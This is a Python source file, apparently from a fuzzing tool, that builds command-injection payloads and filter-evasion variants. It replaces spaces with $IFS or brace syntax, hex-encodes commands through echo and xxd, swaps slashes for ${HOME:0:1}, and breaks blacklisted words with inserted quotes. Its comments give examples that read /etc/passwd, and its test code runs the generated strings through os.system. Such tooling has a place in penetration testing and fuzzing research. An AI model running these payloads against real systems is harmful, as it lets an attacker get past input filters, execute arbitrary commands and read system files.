import socket
import struct
import re
import random
import os


def int2ip(int_ip):
    return socket.inet_ntoa(struct.pack('I', socket.htonl(int_ip)))


def ip2int(ip):
    return socket.ntohl(struct.unpack("I", socket.inet_aton(str(ip)))[0])


class CommandInjectionGenerator:

    def __init__(self, bypass_policy=None, injection_list_filename=None):
        if bypass_policy is None:
            bypass_policy = ['without_space', 'charfilter_via_hex', 'charfilter_slash',
                             'blacklisted_words']
        if injection_list_filename is None:
            injection_list_filename = 'utils/injection_list.txt'
        self.injection_list_filename = injection_list_filename
        self.default_command = 'id'
        self.command_list = []
        self.bypass_policy = bypass_policy

    def load_injection_list(self, ):
        with open(self.injection_list_filename, 'r') as f1:
            self.command_list = [payload.replace('\n', '') for payload in f1.readlines()]

    def replace_command(self, command):
        return [payload.replace(self.default_command, command) for payload in self.command_list]

    def bypass_ip2int(self, command):
        # 将注入命令中的 IP 替换为数字，可绕过对 IP 的校验
        # e.g. 127.0.0.1 == 2130706433
        command_out = command
        result = re.findall(r'[0-9]+(?:\.[0-9]+){3}', command)
        if result:
            for ip in result:
                command_out = command_out.replace(ip, str(ip2int(ip)))
            return command_out
        else:
            return None

    def bypass_without_space(self, command):
        # 绕过对空格的限制
        replace_char_list = ['<', ',', '$IFS', '\\x20', '${IFS}']
        bypass_command_list = []
        for replace_char in replace_char_list:
            bypass_command = command
            if replace_char == ',':
                # e.g. {cat,/etc/passwd}
                bypass_command1 = command
                bypass_command1 = bypass_command1.replace(' ', replace_char)
                bypass_command1 = '{' + bypass_command1 + '}'
                bypass_command_list.append(bypass_command1)

                # e.g. IFS=,;`cat<<<uname,-a`
                bypass_command2 = command
                bypass_command2 = bypass_command2.replace(' ', replace_char)
                bypass_command2 = 'IFS=,;`cat<<<' + bypass_command2 + '`'
                bypass_command_list.append(bypass_command2)
            elif replace_char == '${IFS}':
                # echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
                bypass_command = bypass_command.replace(' ', replace_char)
                bypass_command = 'echo${IFS}"RCE"${IFS}&&' + bypass_command
                bypass_command_list.append(bypass_command)
            elif replace_char == '\\x20':
                # e.g. X=$'uname\x20-a'&&$X
                bypass_command = bypass_command.replace(' ', replace_char)
                bypass_command = "X=$'" + bypass_command + "'&&$X"
                bypass_command_list.append(bypass_command)
            else:
                bypass_command = bypass_command.replace(' ', replace_char)
                bypass_command_list.append(bypass_command)
        return bypass_command_list

    def bypass_charfilter_via_hex(self, command):
        # 通过 16 进制数据绕过对字符串的过滤
        bypass_hax_policy_list = ['echo', 'xxd', 'xxd_echo']
        bypass_command_list = []
        for policy in bypass_hax_policy_list:
            bypass_command = command
            if policy == 'echo':
                # e.g. `echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`  == cat /etc/passwd
                bypass_command = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in bypass_command)
                bypass_command = "`echo $'" + bypass_command + "'`"
                bypass_command_list.append(bypass_command)
            elif policy == 'xxd':
                # e.g. cat `xxd -r -p <<< 2f6574632f706173737764`
                bypass_command = bypass_command.encode('utf-8').hex()
                bypass_command = "`xxd -r -p <<< " + bypass_command + "`"
                bypass_command_list.append(bypass_command)
            elif policy == 'xxd_echo':
                # e.g. cat `xxd -r -ps <(echo 2f6574632f706173737764)`
                bypass_command = bypass_command.encode('utf-8').hex()
                bypass_command = "`xxd -r -ps <(echo " + bypass_command + ")`"
                bypass_command_list.append(bypass_command)
        return bypass_command_list

    def bypass_charfilter_slash(self, command):
        # 绕过对斜杠的过滤
        bypass_slash_policy_list = ['HOME', 'tr']
        bypass_command_list = []
        for policy in bypass_slash_policy_list:
            if policy == 'HOME':
                # e.g. cat ${HOME:0:1}etc${HOME:0:1}passwd
                bypass_command = command
                bypass_command = bypass_command.replace('/', '${HOME:0:1}')
                bypass_command_list.append(bypass_command)
            elif policy == 'tr':
                # cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
                bypass_command = command
                bypass_command = bypass_command.replace('/', """$(echo . | tr '!-0' '"-1')""")
                bypass_command_list.append(bypass_command)
        return bypass_command_list

    def bypass_blacklisted_words(self, command):
        # 通过插入特殊字符绕过黑名单词汇
        bypass_blacklisted_words_list = ['"', "'", '\\', """$@""", ]
        bypass_command_list = []

        for policy in bypass_blacklisted_words_list:
            if policy == '"' or policy == "'":  # or policy == '\\' or policy == """$@""":
                # e.g. w'h'o'am'i
                # e.g. w"h"o"am"i
                for count_num in range(3):
                    bypass_command = ''
                    random_posi = [random.randint(0, 1) for i in range(len(command) - 1)] + [0]
                    change_num = random_posi.count(1)
                    if change_num % 2 == 1:
                        for i in range(len(random_posi)):
                            if random_posi[i] == 0:
                                random_posi[i] = 1
                                break
                    for i in range(len(command)):
                        bypass_command = bypass_command + command[i] + random_posi[i] * policy
                    bypass_command_list.append(bypass_command)
            elif policy == '\\' or policy == """$@""":
                # e.g. w\ho\am\i
                # e.g. who$@ami
                for count_num in range(3):
                    bypass_command = ''
                    random_posi = [random.randint(0, 1) for i in range(len(command) - 1)] + [0]
                    for i in range(len(command)):
                        bypass_command = bypass_command + command[i] + random_posi[i] * policy
                    bypass_command_list.append(bypass_command)
        return bypass_command_list

    def generation(self, target_command):
        self.load_injection_list()
        replaced_command_list = self.replace_command(target_command)
        for command in replaced_command_list:
            command_ippypass = self.bypass_ip2int(command)
            if command_ippypass:
                replaced_command_list.append(command_ippypass)

        # 调试用的测试代码，检测生成后的命令是否可执行，因为很多生成后的命令本身就不可执行，或者执行的命令非预期，会降低模糊测试的效率
        # replaced_command_list = self.self_check(replaced_command_list)

        generation_command_list = []
        generation_command_list += replaced_command_list

        # 这些策略对于文件写入类的操作，均不好用，暂时不启用以下绕过策略
        for command in replaced_command_list:
            policy_generation_command_list = []
            for policy in self.bypass_policy:
                if policy == 'without_space':
                    tmp_list = self.bypass_without_space(command)
                    # tmp_list = self.self_check(tmp_list)
                    # self.bypass_without_space(command)
                    policy_generation_command_list += tmp_list
                    # policy_generation_command_list += self.bypass_without_space(command)
                elif policy == 'charfilter_via_hex':
                    tmp_list = self.bypass_charfilter_via_hex(command)
                    # tmp_list = self.self_check(tmp_list)
                    policy_generation_command_list += tmp_list
                    # policy_generation_command_list += self.bypass_charfilter_via_hex(command)
                elif policy == 'charfilter_slash':
                    tmp_list = self.bypass_charfilter_slash(command)
                    # tmp_list = self.self_check(tmp_list)
                    policy_generation_command_list += tmp_list
                    # policy_generation_command_list += self.bypass_charfilter_slash(command)
                elif policy == 'blacklisted_words':
                    tmp_list = self.bypass_blacklisted_words(command)
                    # tmp_list = self.self_check(tmp_list)
                    policy_generation_command_list += tmp_list
                    # policy_generation_command_list += self.bypass_blacklisted_words(command)
            generation_command_list += policy_generation_command_list
        return generation_command_list

    def self_check(self, replaced_command_list):
        # 调试用的测试代码，检测生成后的命令是否可执行，因为很多生成后的命令本身就不可执行，或者执行的命令非预期，会降低模糊测试的效率
        # 31/56 只有一半多实际能用
        base_command = 'pwd'
        useful_command_list = []
        with open('command_result.txt', 'r') as f1:
            lins_num = len(f1.readlines())
        for command in replaced_command_list:
            exec_command_result = False
            # base_command = 'echo \'\\n\' >> command_result.txt'
            # base_command = 'ls'

            exec_command = base_command + command

            os.system(exec_command)
            with open('command_result.txt', 'r') as f1:
                new_lines = len(f1.readlines())
            if new_lines > lins_num:
                exec_command_result = True
                lins_num = new_lines
            if exec_command_result and command not in useful_command_list:
                print(exec_command)
                useful_command_list.append(command)
        return useful_command_list


def use_case_test():
    injection_bypass_policy = ['without_space', 'charfilter_via_hex', 'charfilter_slash', 'blacklisted_words']
    injection_bypass_policy = ['default']
    fuzz_id = 0
    injection_command = 'echo \'' + str(fuzz_id) + '\' >> command_result.txt'
    # with open('command_result.txt', 'w') as f1:
    #     pass
    for single_policy in injection_bypass_policy:
        injection_generator = CommandInjectionGenerator([single_policy])
        gen_command_list = injection_generator.generation(injection_command)
        base_command = 'pwd'
        for single_injection_command in gen_command_list:
            print(base_command + single_injection_command)
            os.system(base_command + single_injection_command)
        print(len(gen_command_list))
        print(gen_command_list)


if __name__ == '__main__':
    # 用例测试代码
    # use_case_test()

    fuzz_id = '123'
    injection_command = 'echo \'' + fuzz_id + '\' >> /tmp/flag.txt'
    # 绕过策略，缺省为所有策略全都不选择，各策略的效果评估及改进待优化
    # injection_bypass_policy = ['default', 'without_space', 'charfilter_via_hex', 'charfilter_slash', 'blacklisted_words']
    injection_bypass_policy = ['default']
    injection_generator = CommandInjectionGenerator(injection_bypass_policy)
    gen_command_list = injection_generator.generation(injection_command)
    print(len(gen_command_list))
    print(gen_command_list)
